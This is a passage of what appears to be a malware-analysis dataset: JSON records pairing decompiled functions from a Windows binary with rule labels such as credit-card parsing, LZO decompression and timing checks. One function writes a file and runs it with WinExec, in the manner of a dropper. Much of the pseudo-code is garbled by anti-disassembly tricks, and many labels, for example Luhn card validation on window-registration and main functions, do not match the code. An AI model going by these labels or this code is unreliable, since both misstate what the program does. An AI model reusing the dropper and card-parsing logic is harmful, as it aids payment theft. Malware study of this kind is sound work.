*puVar1 = *puVar1 << 3 | *puVar1 >> 0x1d;\n        (*(unaff_EDI + 0x58))(in_CS);\n    }\n    uVar4 = fcn.00402100(0x411414, 0x11, 0x407444, 6);\n    bVar7 = uVar4 < 0x6e32;\n    fcn.00402100(0x411414, 0x11, 0x40744c, 7);\n    if ((bVar7) || (!bVar7)) {\n        arg_14h = 0x7;\n        arg_10h = 0x407454;\n        uVar3 = 0x11;\n    }\n    else {\n        arg_14h = &stack0xffffffe4;\n        if (unaff_EDI == *(unaff_EDI + 0xe58be73)) {\n            in(extraout_EDX);\n            arg_14h = &stack0xffffffe4;\n        }\n    }\n    *(extraout_EDX + 0x11) = *(extraout_EDX + 0x11) + extraout_CH_00;\n    fcn.00402100(0x411414, uVar3, arg_10h, arg_14h);\n    fcn.00402100(0x411414, 0x11, 0x40745c, 6);\n    fcn.00402100(0x411414, 0x11, 0x407464, 0x25);\n    uVar3 = fcn.00402100(0x411414, 0x11, 0x40748c, 8);\n    return uVar3;\n}\n",
        "token_count": 1353
    },
    "00402240": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid fcn.00402240(uint param_1)\n\n{\n    uint uStack48;\n    uint uStack44;\n    code *pcStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack48 = 0x30;\n    uStack44 = 3;\n    pcStack40 = fcn.00403970;\n    uStack36 = 0;\n    uStack32 = 0;\n    uStack28 = param_1;\n    uStack24 = 0;\n    uStack20 = 0;\n    uStack16 = 0;\n    uStack12 = 0;\n    uStack8 = 0x407010;\n    uStack4 = 0;\n    (*_sym.imp.USER32.dll_RegisterClassExA)(&uStack48);\n    return;\n}\n",
        "token_count": 216
    },
    "00402850": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nuint fcn.00402850(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    char **ppcVar6;\n    uint *puVar7;\n    char *pcVar8;\n    char *pcVar9;\n    char *pcVar10;\n    uint *puVar11;\n    uint uStack2112;\n    uint uStack2088;\n    char cStack2084;\n    uint uStack2083;\n    ushort uStack2079;\n    uchar uStack2077;\n    uchar uStack2064;\n    uint uStack2063;\n    uchar auStack1824 [12];\n    uchar auStack1812 [8];\n    uchar uStack1804;\n    uint uStack1803;\n    uchar auStack1564 [260];\n    char acStack1304 [20];\n    uchar auStack1284 [239];\n    char acStack1045 [21];\n    uchar uStack1024;\n    uint uStack1023;\n    \n    if (*0x42346c == 0) {\n        return 0;\n    }\n    uStack2088 = 0;\n    cStack2084 = '\\0';\n    uStack2083 = 0;\n    uStack2079 = 0;\n    uStack2077 = 0;\n    uStack2064 = 0;\n    puVar7 = &uStack2063;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1804 = 0;\n    puVar7 = &uStack1803;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1024 = 0;\n    puVar7 = &uStack1023;\n    for (iVar2 = 0xff; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    uStack2112 = 0x104;\n    *(puVar7 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(auStack1284);\n    (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(0, auStack1812, 0x104);\n    fcn.004047e0(&uStack2112, 6);\n    (*_sym.imp.MSVCRT.dll_sprintf)(auStack1564, 0x4072e8, acStack1304, &uStack2112);\n    uStack2088 = 0x407370;\n    ppcVar6 = &stack0xfffff7d0;\n    iVar2 = 3;\n    do {\n        uVar3 = 0xffffffff;\n        pcVar9 = &cStack2084;\n        do {\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar9 + 1;\n        } while (cVar1 != '\\0');\n        pcVar9 = *ppcVar6;\n        ppcVar6 = ppcVar6 + 1;\n        *(&uStack2088 + ~uVar3 + 3) = 10;\n        uVar3 = 0xffffffff;\n        do {\n            pcVar8 = pcVar9;\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            pcVar8 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar8;\n        } while (cVar1 != '\\0');\n        uVar3 = ~uVar3;\n        iVar4 = -1;\n        pcVar9 = &cStack2084;\n        do {\n            pcVar10 = pcVar9;\n            if (iVar4 == 0) break;\n            iVar4 = iVar4 + -1;\n            pcVar10 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar10;\n        } while (cVar1 != '\\0');\n        puVar7 = pcVar8 + -uVar3;\n        puVar11 = pcVar10 + -1;\n        for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n        iVar2 = iVar2 + -1;\n        for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n    } while (iVar2 != 0);\n    (*_sym.imp.MSVCRT.dll_sprintf)(acStack1045 + 1, &cStack2084, auStack1824, auStack1824, acStack1304[0]);\n    pcVar9 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar9 != '\\0');\n    acStack1045[~uVar3] = '\\n';\n    uVar3 = 0xffffffff;\n    pcVar9 = 0x407388;\n    do {\n        pcVar8 = pcVar9;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar8 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar8;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    iVar2 = -1;\n    pcVar9 = acStack1045 + 1;\n    do {\n        pcVar10 = pcVar9;\n        if (iVar2 == 0) break;\n        iVar2 = iVar2 + -1;\n        pcVar10 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar10;\n    } while (cVar1 != '\\0');\n    puVar7 = pcVar8 + -uVar3;\n    puVar11 = pcVar10 + -1;\n    for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    pcVar9 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar9 != '\\0');\n    iVar2 = fcn.004021b0(auStack1564, 0x4072e4, acStack1045 + 1, ~uVar3 - 1);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    (*_sym.imp.KERNEL32.dll_WinExec)(auStack1564, 0);\n    return 1;\n}\n",
        "token_count": 1868
    },
    "00402a60": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00402ac2) overlaps instruction at (ram,0x00402ac1)\n// \n// WARNING: Removing unreachable block (ram,0x00402ab2)\n// WARNING: Removing unreachable block (ram,0x00402ab7)\n\nuint __cdecl fcn.00402a60(uint arg_8h)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_20fh;\n    uchar s;\n    uint var_10bh;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar3 = &var_20fh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    *(puVar3 + 2) = 0;\n    s = 0;\n    puVar3 = &var_10bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    *(puVar3 + 2) = 0;\n    // WARNING: Bad instruction - Truncating control flow here\n    iVar1 = *0x10;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(iVar1 + -0x214, 0x104);\n    (*_sym.imp.MSVCRT.dll_sprintf)(iVar1 + -0x110, 0x7028, iVar1 + -0x214, arg_8h);\n    fcn.00404df0(iVar1 + -8, iVar1 + -0xc);\n    int.00402bb0(var_4h);\n    iVar2 = fcn.00401dd0(&s, var_4h, var_8h);\n    if (iVar2 != 0) {\n        fcn.00403550(&s, 0xffffffff);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 501
    },
    "00402e20": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498",
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402e7b) overlaps instruction at (ram,0x00402e77)\n// \n// WARNING: Unable to track spacebase fully for stack\n\nint32_t __cdecl fcn.00402e20(uint *arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint *puVar1;\n    char cVar2;\n    bool bVar3;\n    uint16_t in_AX;\n    uint *puVar4;\n    uint *puVar5;\n    uint *puVar6;\n    uint16_t *puVar7;\n    uint16_t *puVar8;\n    uint *puVar9;\n    uint *puVar10;\n    uint *unaff_EDI;\n    bool bVar11;\n    uint auStack24175 [6038];\n    uint uStack16;\n    \n    puVar4 = &stack0xfffffffc;\n    bVar11 = (in_AX & 0x11cb) != 0;\n    puVar10 = &stack0xfffffffc;\n    if ((bVar11) && (puVar10 = &stack0xfffffffc,  !bVar11)) {\n        puVar9 = &uStack16;\n        puVar10 = &uStack16;\n        cVar2 = '\\x10';\n        do {\n            puVar4 = puVar4 + -1;\n            puVar9 = puVar9 + -1;\n            *puVar9 = *puVar4;\n            cVar2 = cVar2 + -1;\n        } while ('\\0' < cVar2);\n    }\n    puVar7 = *(puVar10 + 0xc);\n    bVar11 = false;\n    puVar4 = *(puVar10 + 0x10);\n    puVar9 = arg_8h;\n    for (puVar10 = puVar4; bVar3 = puVar10 == NULL,  puVar4 = puVar5,  arg_8h = puVar6,  puVar7 = puVar8,  !bVar3;\n        puVar10 = puVar10 + 3) {\n        if ((bVar11 || bVar3) || (!bVar11 && !bVar3)) {\n            puVar4 = *puVar7;\n        }\n        *unaff_EDI = *puVar10;\n        *(puVar10 + -0x71) = *(puVar10 + -0x71) << 2;\n        puVar6 = arg_8h + auStack24175;\n        puVar5 = puVar6 >> 0x10;\n        bVar11 = puVar6 >> 0x10 != 0;\n        if (bVar11) {\n            if ((bVar11) && (!bVar11)) {\n                puVar9 = puVar4 + -1;\n                puVar4[-1] = 0x33e181d0;\n                puVar1 = 0x33e181d0;\n                cVar2 = '\\x10';\n                do {\n                    puVar1 = puVar1 + -1;\n                    puVar9 = puVar9 + -1;\n                    *puVar9 = *puVar1;\n                    cVar2 = cVar2 + -1;\n                } while ('\\0' < cVar2);\n                puVar4[-0x12] = puVar4 + -1;\n            }\n            puVar5 = puVar5 + (puVar6 & 0xffff);\n            puVar6 = puVar5;\n        }\n        bVar11 = 0xfffffffd < puVar7;\n        puVar8 = puVar7 + 1;\n        puVar9 = puVar6;\n        unaff_EDI = unaff_EDI + 1;\n    }\n    return (puVar9 >> 0x10) + puVar9;\n}\n",
        "token_count": 828
    },
    "00404680": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498",
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00404748) overlaps instruction at (ram,0x00404744)\n// \n// WARNING: Removing unreachable block (ram,0x004046cd)\n// WARNING: Removing unreachable block (ram,0x004046d2)\n// WARNING: Removing unreachable block (ram,0x00404748)\n// WARNING: Removing unreachable block (ram,0x004046ab)\n\nunkbyte10 fcn.00404680(void)\n\n{\n    uchar *puVar1;\n    uint8_t uVar2;\n    uint32_t in_EAX;\n    uint32_t uVar3;\n    uchar *puVar4;\n    uint32_t unaff_ESI;\n    uint32_t uVar5;\n    int32_t iVar6;\n    char in_SF;\n    char in_OF;\n    bool bVar7;\n    unkbyte10 extraout_ST0;\n    \n    puVar4 = &stack0xfffffffc;\n    puVar1 = &stack0xfffffffc;\n    if (in_OF == in_SF) {\n        do {\n            uVar5 = in_EAX;\n            puVar1 = puVar4;\n            if (in_OF == in_SF) goto code_r0x0040469b;\n            puVar4 = puVar4 + 1;\n            in_OF = '\\0';\n            uVar2 = unaff_ESI | 0x8b;\n            in_EAX = unaff_ESI | 0x8b;\n            in_SF = uVar2 < '\\0';\n            unaff_ESI = uVar5;\n        } while (uVar2 != 0);\n    }\n    else {\ncode_r0x0040469b:\n        puVar4 = puVar1;\n        in_EAX = *(puVar4 + 0xc);\n        uVar5 = *(puVar4 + 8);\n    }\n    uVar3 = fcn.00402e20(0, uVar5, in_EAX + 1 >> 1);\n    // WARNING: Bad instruction - Truncating control flow here\n    uVar3 = uVar3 & 0xffff;\n    bVar7 = false;\n    iVar6 = (*_sym.imp.dbghelp.dll_ImageNtHeader)(uVar5);\n    *(puVar4 + 8) = iVar6;\n    if ((!bVar7) && (bVar7)) {\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    uVar5 = *(iVar6 + 0x58);\n    if (uVar3 < uVar5) {\n        iVar6 = (uVar3 - uVar5 & 0xffff) - 1;\n    }\n    else {\n        iVar6 = uVar3 - (uVar5 & 0xffff);\n    }\n    if (iVar6 < uVar5 >> 0x10) {\n        iVar6 = (iVar6 - (uVar5 >> 0x10) & 0xffff) - 1;\n    }\n    else {\n        iVar6 = iVar6 - (uVar5 >> 0x10);\n    }\n    **(puVar4 + 0x14) = iVar6 + *(puVar4 + 0xc);\n    **(puVar4 + 0x10) = *(*(puVar4 + 8) + 0x58);\n    return extraout_ST0;\n}\n",
        "token_count": 738
    },
    "00402ec0": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402ef8) overlaps instruction at (ram,0x00402ef7)\n// \n\nuint __cdecl fcn.00402ec0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint32_t arg_18h, uint arg_1ch)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    uchar uVar3;\n    uint32_t in_ECX;\n    int32_t iVar4;\n    uint8_t uVar5;\n    int32_t in_EDX;\n    uint8_t *unaff_EBX;\n    uint unaff_ESI;\n    uint32_t uVar6;\n    uint *puVar7;\n    int32_t unaff_EDI;\n    uint *puVar8;\n    uint16_t in_CS;\n    bool bVar9;\n    uchar var_24h;\n    uint var_23h;\n    uint *var_4h;\n    \n    uVar5 = in_EDX ^ unaff_EBX >> 8 | 0x67;\n    bVar9 = uVar5 < '\\0';\n    if ((uVar5 == 0) || (uVar5 != 0)) {\n        uVar6 = in_ECX;\n        if (!bVar9) goto code_r0x00402eea;\n    }\n    else {\n        uVar5 = *unaff_EBX;\n        piVar1 = unaff_EDI + 0x78;\n        *piVar1 = *piVar1 - &stack0xffffffcc;\n        bVar9 = *piVar1 < 0;\n        uVar6 = in_ECX & 0xffff0000;\n        in_ECX = in_ECX & 0xffff0000 | CONCAT11((in_ECX >> 8) - uVar5, in_ECX);\n        uVar6 = uVar6 | in_CS;\ncode_r0x00402eea:\n        if (bVar9) goto code_r0x00402eee;\n    }\n    in_ECX = arg_18h;\ncode_r0x00402eee:\n    *unaff_EBX = *unaff_EBX & 0xc3;\n    *(in_EDX + 7) = (*(in_EDX + 7) - (in_ECX >> 8)) - (*(unaff_EBX + 0x4d8b1c45) < in_ECX);\n    var_4h = fcn.00404a30(in_ECX, unaff_ESI, 0x407058, uVar6);\n    pcVar2 = _sym.imp.MSVCRT.dll_rand;\n    if (var_4h == NULL) {\n        return 0;\n    }\n    var_24h = 0;\n    puVar7 = &var_23h;\n    for (iVar4 = 7; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    uVar6 = 0;\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    do {\n        uVar3 = (*pcVar2)();\n        (&var_24h)[uVar6] = uVar3;\n        uVar6 = uVar6 + 1;\n    } while (uVar6 < 0x20);\n    puVar7 = &var_24h;\n    puVar8 = var_4h;\n    for (iVar4 = 8; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar8 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar8 = puVar8 + 1;\n    }\n    fcn.00404ec0(arg_8h, arg_ch, arg_10h, arg_14h, &var_24h, 0x20, var_4h);\n    fcn.004027a0(arg_18h, arg_1ch);\n    return 1;\n}\n",
        "token_count": 894
    },
    "00404b90": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681",
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404d5e) overlaps instruction at (ram,0x00404d5d)\n// \n// WARNING: Removing unreachable block (ram,0x00404d46)\n// WARNING: Could not reconcile some variable overlaps\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint * __cdecl fcn.00404b90(uint *arg_8h, uint *arg_ch)\n\n{\n    uint8_t *puVar1;\n    uint8_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint16_t uVar5;\n    uint16_t uVar6;\n    uint32_t in_EAX;\n    uint *puVar7;\n    uint *puVar8;\n    uint16_t uVar9;\n    uint in_EDX;\n    char cVar10;\n    uint32_t unaff_EBX;\n    int32_t unaff_ESI;\n    uint *unaff_EDI;\n    uint *puVar12;\n    uint *puVar13;\n    ushort in_SS;\n    bool bVar14;\n    bool in_PF;\n    bool bVar15;\n    bool bVar16;\n    uint8_t in_AF;\n    bool bVar17;\n    float10 in_ST0;\n    double in_stack_41c692c5;\n    uint16_t uStack28;\n    uint16_t uStack24;\n    uint16_t uStack20;\n    ushort uStack18;\n    uint16_t uStack16;\n    uint8_t uVar11;\n    \n    puVar7 = &stack0xfffffffc;\n    if ((in_PF) || (!in_PF)) {\n        *arg_8h = 0x42;\n        unaff_EDI = arg_8h;\n    }\n    *(unaff_EBX + 0x7c6087d) = *(unaff_EBX + 0x7c6087d) | 0x42;\n    *(unaff_EDI + 1) = 0x93;\n    uStack28 = in_EDX;\n    *(unaff_EDI + 2) = 0x7d;\n    uVar3 = (in_EAX >> 8 & 0xffff00) << 8;\n    uVar4 = in_EAX & 0xffff;\n    *(unaff_EDI + 3) = 0x5a;\n    uStack20 = uVar4;\n    uVar6 = uStack20;\n    *(unaff_EDI + 1) = 0x66;\n    *(arg_8h + 5) = 0xe;\n    *(arg_8h + 6) = 0x9d;\n    uStack20 = unaff_EDI;\n    uStack24 = uStack20;\n    uStack18 = unaff_EDI >> 0x10;\n    uVar9 = uStack28 - 1 & arg_8h;\n    uStack20 = uStack28;\n    *(arg_8h + 7) = 0x88;\n    if ((uVar9 < 1) || (uVar5 = uStack24,  0 < uVar9)) {\n        *(arg_8h + 2) = 0x71;\n        uVar5 = uStack20;\n        uStack18 = in_EDX >> 0x10;\n    }\n    uStack20 = uVar5;\n    *(arg_8h + 0x52) = *(arg_8h + 0x52) | in_EDX >> 8;\n    bVar15 = (POPCOUNT(uVar6 & 0xcb) & 1U) == 0;\n    *(arg_8h + 9) = 0x66;\n    if ((bVar15) || (puVar8 = arg_8h,  !bVar15)) {\n        *(arg_8h + 10) = 0x68;\n        uStack28 = uStack20;\n        uStack24 = arg_8h;\n        puVar8 = uVar3 | uVar4;\n    }\n    bVar15 = -1 < (arg_8h & 0xffff0000 | CONCAT11((arg_8h >> 8 | *((uVar3 | uVar4) + 0x60)) - unaff_EBX, arg_8h)) -\n                  CONCAT22(uStack18, uStack20);\n    *(arg_8h + 0xb) = 0xf2;\n    puVar12 = arg_8h;\n    if ((bVar15) && (!bVar15)) {\n        *(arg_8h + 7) = in_ST0 - in_stack_41c692c5;\n        puVar12 = arg_8h + 5;\n        unaff_ESI = unaff_ESI + 5;\n    }\n    *(puVar12 + 3) = 0x13;\n    uStack16 = uStack24;\n    *(puVar12 + 0xd) = 0x1f;\n    *(puVar12 + 0xe) = 0x9f;\n    cVar10 = uStack24;\n    bVar17 = SBORROW1(cVar10, '\\x01');\n    bVar15 = cVar10 + -1 < '\\0';\n    *(arg_8h + 0xf) = 99;\n    puVar13 = puVar12;\n    if (cVar10 < '\\x01') goto code_r0x00404d45;\ncode_r0x00404d2c:\n    puVar13 = puVar12;\n    uStack28._0_1_ = uStack16;\n    if (bVar17 != bVar15) {\n        out(0xc4, puVar8);\n        uStack28._0_1_ = uStack16 ^ arg_8h;\n        puVar13 = puVar12 + 1;\n        *puVar12 = puVar8;\n    }\ncode_r0x00404d45:\n    uStack16 = puVar8;\n    *(arg_8h + 4) = 0xb9;\n    *(arg_8h + 0x11) = 0x81;\n    bVar14 = false;\n    bVar17 = false;\n    bVar15 = false;\n    bVar16 = (POPCOUNT(uStack28 & 0x66) & 1U) == 0;\n    *(arg_8h + 0x12) = 0xbe;\n    if (bVar16) goto code_r0x00404d7d;\n    do {\n        uStack16 = puVar8;\n        if (bVar16) {\n            puVar8 = &uStack16;\n            cVar10 = '\\x1e';\n            do {\n                puVar7 = puVar7 + -1;\n                puVar8 = puVar8 + -1;\n                *puVar8 = *puVar7;\n                cVar10 = cVar10 + -1;\n            } while ('\\0' < cVar10);\n            puVar7 = in(0x78);\n            return puVar7;\n        }\ncode_r0x00404d7d:\n        *(arg_8h + 0x13) = 0x7b;\n        uVar6 = uStack16;\n        if ((bVar16) || (!bVar16)) {\ncode_r0x00404da5:\n            *(arg_8h + 5) = 0x55;\n            uStack16 = unaff_EBX;\n            *(arg_8h + 0x15) = 0x48;\n            uVar9 = uVar6 + uStack16 | 0x11a9;\n            bVar15 = uVar9 < 0;\n            bVar17 = uVar9 == 0;\n            uStack16 = uVar6;\n        }\n        else {\n            puVar8 = segment(in_SS, *0x10 + -0xc);\n            puVar8 = *puVar8;\n            if (!bVar14) {\n                puVar12 = puVar13;\n                if (!bVar16) {\n                    uVar6 = puVar8;\n                    goto code_r0x00404da5;\n                }\n                goto code_r0x00404d2c;\n            }\n            bVar15 = (puVar8 | 0x5a5e11a9) < 0;\n            bVar17 = (puVar8 | 0x5a5e11a9) == 0;\n        }\n        *(arg_8h + 0x16) = 0xdd;\n        if ((bVar17 || bVar15) || (!bVar17 && !bVar15)) {\n            *arg_ch = 0x17;\n            return arg_ch;\n        }\n        in_AF = 9 < (uStack16 & 0xf) | in_AF;\n        puVar8 = CONCAT11((uStack16 >> 8) + in_AF, uStack16 + in_AF * '\\x06') & 0xffffff0f;\n        if (arg_8h != NULL) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n        arg_8h = 0x1;\n        puVar1 = unaff_ESI + -0x2474e586;\n        uVar11 = unaff_EBX >> 8;\n        uVar2 = uVar11 + *puVar1;\n        bVar14 = CARRY1(uVar11, *puVar1) || CARRY1(uVar2, in_AF);\n        bVar17 = SCARRY1(uVar11, *puVar1) != SCARRY1(uVar2, in_AF);\n        cVar10 = uVar2 + in_AF;\n        unaff_EBX = CONCAT11(cVar10, unaff_EBX);\n        bVar15 = cVar10 < '\\0';\n        bVar16 = (POPCOUNT(cVar10) & 1U) == 0;\n    } while( true );\n}\n",
        "token_count": 2179
    },
    "00401000": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401000(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t in_ECX;\n    int32_t iVar2;\n    uint32_t unaff_EDI;\n    uint16_t in_ES;\n    char cVar3;\n    char cVar4;\n    uint32_t hSCManager;\n    uint uVar5;\n    \n    // [00] -r-x section size 20480 named .text\n    cVar4 = SBORROW4(in_EAX, in_ECX);\n    cVar3 = in_EAX - in_ECX < 0;\n    uVar5 = 0;\n    hSCManager = 0;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)(0, 0, 0xf003f);\n    iVar2 = iVar1;\n    if ((cVar4 == cVar3) && (cVar4 != cVar3)) {\n        hSCManager = hSCManager & 0xffff0000 | in_ES;\n        iVar2 = iVar1 + -1;\n        *(unaff_EDI | &stack0xfffffffc) = iVar1;\n    }\n    uVar5 = fcn.00402d90(hSCManager, uVar5);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n    return uVar5;\n}\n",
        "token_count": 305
    },
    "00401060": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00401060(void)\n\n{\n    uint uVar1;\n    \n    if (*0x423438 == 0) {\n        uVar1 = (*_sym.imp.MSVCRT.dll_time)(0);\n        (*_sym.imp.MSVCRT.dll_srand)(uVar1);\n        *0x423438 = 1;\n    }\n    return;\n}\n",
        "token_count": 81
    },
    "null": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint __cdecl main(uint argv)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    code *pcVar3;\n    int16_t iVar4;\n    int32_t iVar5;\n    uint lpMsg;\n    \n    iVar4 = fcn.00402240(argv);\n    if ((iVar4 != 0) && (iVar5 = fcn.00401f00(argv),  pcVar1 = _sym.imp.USER32.dll_GetMessageA,  iVar5 != 0)) {\n        iVar5 = (*_sym.imp.USER32.dll_GetMessageA)(&lpMsg, 0, 0, 0);\n        pcVar3 = _sym.imp.USER32.dll_GetDesktopWindow;\n        pcVar2 = _sym.imp.USER32.dll_TranslateMessage;\n        while (iVar5 != 0) {\n            (*pcVar2)(&lpMsg);\n            (*pcVar3)();\n            (*_sym.imp.USER32.dll_DispatchMessageA)(&lpMsg);\n            iVar5 = (*pcVar1)(&lpMsg, 0, 0, 0);\n        }\n    }\n    return 0;\n}\n",
        "token_count": 241
    },
    "004012a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004012a0(uint param_1, uint param_2, uint param_3)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_wcslen)(param_1);\n    (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(0, 0, param_1, iVar1 + 1, param_2, param_3, 0, 0);\n    return;\n}\n",
        "token_count": 103
    },
    "004014a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.004014a0(int32_t *hWnd)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t *piVar5;\n    int32_t *unaff_EDI;\n    uint *puVar6;\n    ushort in_SS;\n    int32_t **in_FS_OFFSET;\n    bool bVar7;\n    bool bVar8;\n    uint uVar9;\n    uint var_24ch;\n    uchar var_148h;\n    uint var_147h;\n    uint uStack88;\n    int32_t *piStack84;\n    int32_t *var_44h;\n    int32_t var_40h;\n    uint var_3ch;\n    uint pbstr;\n    int32_t *var_34h;\n    uint var_30h;\n    uint var_2ch;\n    int32_t *var_28h;\n    int32_t *var_24h;\n    int32_t *var_20h;\n    int32_t var_1ch;\n    char *lpdwResult;\n    int32_t *var_14h;\n    int32_t *var_10h;\n    int32_t *var_ch;\n    uint uStack12;\n    int32_t var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x405250;\n    do {\n        var_ch = *in_FS_OFFSET;\n        *in_FS_OFFSET = &fcn.004014a0::var_ch;\n        (*_sym.imp.ole32.dll_CoInitialize)(0, unaff_EDI);\n        var_44h = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x4073fc);\n        bVar7 = false;\n        bVar8 = (POPCOUNT(var_44h & 0xff) & 